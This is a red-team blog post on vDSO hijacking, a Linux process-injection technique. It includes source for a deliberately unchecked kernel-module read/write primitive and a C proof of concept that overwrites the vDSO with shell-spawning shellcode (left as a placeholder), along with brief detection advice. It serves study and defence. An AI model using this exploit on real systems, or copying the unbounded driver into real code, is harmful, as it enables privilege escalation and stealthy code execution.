---
title:  vDSO Hijacking 
date: 2025-04-01 18:55:00 +0800
categories: [Red Team, Linux Internals, Malware Development]
tags: [vDSO, Linux, Exploit Development, Process Injection, APT, PoC, Kernel]
pin: true
---

### Introduction

![](https://cdn-images-1.medium.com/max/1200/1*etmQq_ADjWLIc4Lo7eGKEg.png)

&rarr; I was going through different process injection techniques on MITRE ATT&CK and noticed that some were barely documented. Thought it’d be a good idea to dig into them and write about what I find.

![](https://cdn-images-1.medium.com/v2/resize:fit:400/1*WkELIDGtRWMGjYH3JPXPvQ.png)

I considered looking into vDSO but saw it was a Linux process injection technique. Since I’m not too familiar with Linux internals( I use Arch btw 😎) , I wasn’t too confident at first, but this seemed like a good chance to learn about internals.

---

### What is vDSO?

&rarr; vDSO stands for Virtual Dynamic Shared Object—think of it like a DLL, but for Linux. Unlike regular shared objects, vDSO is mapped into a process’s memory by the kernel and provides a shortcut for certain system calls, specifically to improve performance.

&rarr; Normally, when a user-space application makes a system call, it has to transition into kernel mode, which incurs some overhead. vDSO allows certain frequently used system calls—like gettimeofday() and clock_gettime()—to be executed directly in user space, avoiding the costly context switch. Instead of making a full syscall and switching to kernel mode, the application simply reads the required time value from a memory page mapped by the kernel.

```c
struct vdso_data {
    uint32_t seq;                  // Sequence counter for consistency
    uint64_t clock_mode;            // Clock mode (TSC, HPET, etc.)
    uint64_t cycle_last;            // Last known cycle count
    uint64_t mask;                  // Mask for time computation
    uint64_t mult;                  // Multiplier for time calculation
    uint64_t shift;                 // Bit shift for time conversion
    struct timespec base;           // Base time for calculations
};
```

![](https://cdn-images-1.medium.com/v2/resize:fit:800/1*TTRGjxq54Jk6vKgVrvXe0A.png)

&rarr; It's important to understand how vDSO is mapped unto the memory of a running process. We can see that it occupies 8 KB (0x2000 bytes) in memory. It's Readable (r) and Executable (x) but not writable (-). Since vDSO is not an actual file on disk, the offset is typically zero and this mapping allows user-space applications to call vDSO functions without requiring a full context switch to kernel mode.


![](https://cdn-images-1.medium.com/v2/resize:fit:800/1*Zz4vXzQDPhIwWvpJQpQXIQ.png)
> The vDSO is mapped with `r-x` permissions by the kernel, hence not writable from user space. We bypass this using our custom vulnerable kernel driver.


---

### vDSO Hijacking

&rarr; While looking on internet I could hardly find resources to find a working PoC. I did come up with few good papers and few blogs that helped me understand the concept.

&rarr; Since vDSO is mapped into every process by the kernel, it can be a target vector. By modifying or replacing the vDSO memory mapping, an attacker can execute arbitrary code whenever a process calls a vDSO function like gettimeofday() or clock_gettime().

- Exploit an arbitrary read vulnerability to locate the vDSO within the randomized process address space.
- Use an arbitrary write primitive to overwrite the gettimeofday() function with our shellcode.
- Wait for a privileged process to invoke gettimeofday().
- Capture the resulting root shell when the malicious payload executes.

&rarr; Before we jump to the actual hijack, we need a way to read and write arbitary memory. For that, we can write a simple kernel module that exposes an IOCTL interface that can arbitrarily read and write.

```c
#define DEVICE_NAME "rw_kernel_module"

long device_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    struct vunl *v = (struct vunl *)arg;

    switch (cmd) {
        case CHANGE_POINT:
            target = v->point;
            break;
        case RW_READ:
            copy_to_user(v->point, target, v->size);
            break;
        case RW_WRITE:
            copy_from_user(target, v->point, v->size);
            break;
    }
    return 0;
}
```

- **Remember the module has no bounds checking for the pointer redirection**. We can compile and insert using insmod and the driver is created at /dev/rw_kernel_module which can further be used.

---

### Exploiting vDSO

&rarr; Now that we have our vulnerable kernel driver ready, we can leverage it further.

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/auxv.h>
#include <sys/mman.h>

#define CHANGE_POINT 0x100000
#define RW_READ 0x100001
#define RW_WRITE 0x100002

struct vunl {
    char *point;
    size_t size;
} VUNL;

char shellcode[] =
    " our shellcode here "

size_t get_vdso_address() {
    size_t addr = getauxval(AT_SYSINFO_EHDR);
    if (!addr) {
        puts("[-] Unable to get vDSO address");
        exit(1);
    }
    printf("[+] vDSO address: 0x%lx\n", addr);
    return addr;
}

int main() {
    int fd = open("/dev/rw_any_dev", O_RDWR);
    if (fd < 0) {
        perror("[-] Cannot open device");
        return 1;
    }

    char *buf = malloc(0x1000);
    size_t vdso_addr = get_vdso_address();

    VUNL.point = (char *)vdso_addr;
    VUNL.size = 0x1000;
    ioctl(fd, CHANGE_POINT, &VUNL);
    ioctl(fd, RW_READ, buf);
    sleep(1);

    printf("[+] Overwriting vDSO at: %p\n", VUNL.point);
    VUNL.size = strlen(shellcode);
    ioctl(fd, RW_WRITE, shellcode);
    sleep(1);

    puts("[+] Shellcode injected. Checking execution...");
    ((void (*)())vdso_addr)();

    return 0;
}
```

- The shellcode uses `execve` to spawn `/bin/sh`[^1].
- We fetch the base address of the vDSO region using `getauxval(AT_SYSINFO_EHDR)`, which gives us an entry point into the memory-mapped vDSO.
- We open the driver and first read from the vDSO region.
- We overwrite the beginning of vDSO (which has gettimeofday()) with our shellcode.
- Since the vDSO is executable (r-xp) by default, the shellcode can now run from there.

💡 In a production exploit chain, you'd wait for a root process to naturally invoke a vDSO function, like gettimeofday() — then catch the reverse shell and escalate.

<video width="100%" controls autoplay muted loop>
  <source src="/assets/img/vdso.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>



---

### Why mprotect() doesn't work

&rarr; If you try to use `mprotect()` to make the vDSO region writable, you’ll get a `Permission denied`. This is because the kernel maps it with special flags (VM_SPECIAL), and user space is not allowed to change them. That’s why we need a kernel driver or root-level memory write primitive to modify the vDSO.

---

### Real World Detection 

&rarr; This technique is **very stealthy**, but it’s not completely invisible. You can detect vDSO tampering via:
- Integrity checks on the vDSO page (comparing with known-good memory dumps).
- Runtime syscall tracing (via `auditd`, `strace`, or eBPF probes).
- Unusual memory execution patterns flagged by EDR solutions (although rare).

---


> - This technique assumes arbitrary **kernel memory write**, typically achieved through a vulnerable driver or LPE.
> - **ASLR** randomizes vDSO base address; `getauxval()` bypasses this.
> - Since very few defenders look at vDSO, this can bypass many traditional detection systems.

---


Thanks for reading this analysis! ❤️  
Feel free to connect with me on:  

**Discord**: `somedieyoungzz`  
**Twitter**: [@IdaNotPro](https://twitter.com/IdaNotPro)

---

[^1]: The shellcode uses `execve("/bin/sh")` to spawn a shell. You can swap it for reverse shell code or anything else depending on your use case.

